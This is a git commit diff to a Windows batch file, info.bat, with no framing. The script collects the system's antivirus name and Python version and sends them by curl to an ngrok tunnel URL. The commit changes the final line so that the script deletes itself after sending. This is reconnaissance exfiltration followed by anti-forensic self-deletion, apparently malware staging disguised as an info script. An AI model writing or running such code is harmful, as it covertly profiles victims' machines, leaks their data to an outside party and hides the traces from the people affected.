c5e88d69fcd34678efcbe8389e599b22121a529c
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-04 21:29:07 +0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -7,4 +7,4 @@ echo Antivirus Information: %antivirus%
 for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
 echo Python Version: %python_version%
 curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" https://e977-197-35-34-224.ngrok-free.app
-exit
+del "%~f0"
